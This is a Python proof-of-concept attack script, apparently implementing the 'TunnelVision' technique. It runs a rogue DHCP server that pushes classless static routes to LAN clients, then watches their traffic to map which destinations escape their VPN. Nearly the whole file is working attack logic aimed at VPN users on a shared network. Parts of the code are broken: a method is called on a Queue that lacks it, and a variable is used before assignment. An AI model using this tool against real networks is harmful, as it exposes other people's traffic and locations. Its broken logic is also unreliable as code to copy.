#!/usr/bin/env python3
from arcane.network.interface import NetworkInterface
from arcane.dhcp.lease import DHCPLease
from arcane.dhcp.server import DHCPServer
from arcane.dhcp.subleaser import DHCPSubleaser
from arcane.dhcp.releaser import DHCPReleaser
from arcane.runtime import RUNTIME, api, on_event
from arcane.threaded_worker import ThreadedWorker
from arcane.events import DHCPServerEvent, ARPTableEvent, DHCPReleaseEvent, NetworkInterfaceEvent
from enum import Enum, auto
from scapy.all import DHCP, ARP
from queue import Queue
import ipaddress
import logging
import argparse
import time


parser = argparse.ArgumentParser(prog='TunnelVision PoC', description='Decloaks VPN users on the LAN')
parser.add_argument('-i', '--interface', help="Interface to listen on", required=True)
parser.add_argument('-l', '--lease-time', type=int, default=10, help="Lease duration")
parser.add_argument('-v', '--verbose', action="store_true", help="Print DEBUG messages to console")


class SidechannelState(Enum):
    STARTED = auto()
    WAITING_FOR_ACCEPT = auto()
    ANALYSIS = auto()
    FINISHED = auto()


class RouteSearchSpace(object):
    def __init__(self, space: str):
        self.space = ipaddress.IPv4Network(space) if type(space) is str else space
    
    def split(self):
        return [RouteSearchSpace(s) for s in self.space.subnets(1)]
    
    def __str__(self):
        return str(self.space)


    def invert(self):
        return [str(net) for net in ipaddress.IPv4Network('0.0.0.0/0').address_exclude(self.space)]



class ClientState(object):
    def __init__(self, searchspace, state: SidechannelState=SidechannelState.STARTED, desired_end_cidr: int=32):
        self.state            = state
        self.traffic_observed = False
        self.current_space    = searchspace
        self.space_queue      = Queue()
        self.desired_end_cidr = desired_end_cidr
        self.destinations     = []

        # Assume that it's sending something right off the bat
        self.space_queue.handle_noblock()


    def is_complete(self):
        return self.space_queue.empty()


    def handle_noblock(self):
        # If there's still traffic, then put it in the list
        if space.prefixlen == self.desired_end_cidr:
            self.destinations.append(space)
        else:
            for space in self.current_space.split():
                self.space_queue.put(space)


    def next_space(self):
        next_space = self.space_queue.get()
        self.current_space = next_space
        return next_space



class Sidechanneler(ThreadedWorker):
    def __init__(self, server: DHCPServer, searchspace):
        self.server      = server
        self.clients     = {}
        self.searchspace = RouteSearchSpace(searchspace)
        super().__init__()


    @on_event(DHCPServerEvent.LEASE_ACCEPTED)
    def handle_lease_accepted(self, mac_address: str, lease: DHCPLease):
        # Client not registered, start the FSM
        if not mac_address in self.clients:
            self.clients[mac_address] = ClientState(self.searchspace)
            self.inject_routes(mac_address, lease, do_after=self.server.options['lease_time'])

        # Lease has been accepted! Move to analysis
        elif self.clients[mac_address].state == SidechannelState.WAITING_FOR_ACCEPT:
            self.clients[mac_address].state = SidechannelState.ANALYSIS
            self.analyze_traffic(mac_address, lease, do_after=self.server.options['lease_time']+5)


    @on_event(NetworkInterfaceEvent.READ, lambda iface, proto, packet: DHCP not in packet and ARP not in packet)
    @api
    def listen_for_traffic(self, iface, proto, packet):
        # TODO: Check for outbound to router via router MAC
        if packet.src in self.clients and self.clients[packet.src].state == SidechannelState.ANALYSIS:
            self.clients[packet.src].traffic_observed = True


    @api
    def inject_routes(self, mac_address: str, lease: DHCPLease):
        next_space = self.clients[mac_address].next_space()
        lease.options.update({'classless_static_routes': [f'{net}:{self.server.options['router']}' for net in next_space.invert()]})

        self.clients[mac_address].state = SidechannelState.WAITING_FOR_ACCEPT
        self.clients[mac_address].traffic_observed = False


    @api
    def analyze_traffic(self, mac_address: str, lease: DHCPLease):
        # There's still traffic; do more blocking
        if self.clients[mac_address].traffic_observed:
            self.clients[mac_address].handle_noblock()

        self.inject_routes(mac_address, lease, do_after=self.server.options['lease_time'])


def main():
    args = parser.parse_args()
    logging.root.setLevel(logging.DEBUG if args.verbose else logging.INFO)

    RUNTIME.event_manager.log_filter.allowlist_events.add(DHCPServerEvent.LEASE_OFFERED)
    RUNTIME.event_manager.log_filter.allowlist_events.add(ARPTableEvent.ENTRY_CHANGED)
    RUNTIME.event_manager.log_filter.allowlist_events.add(DHCPReleaseEvent.LEASE_RELEASED)

    interface = NetworkInterface(args.interface)
    server    = DHCPServer(interface, DHCPSubleaser(interface), **{
        "router": interface.ip_address,
        "name_server": "8.8.8.8"
    })

    side_channeler = Sidechanneler(server, "0.0.0.0/0")
    interface.thread.join()


if __name__ == "__main__":
    main()
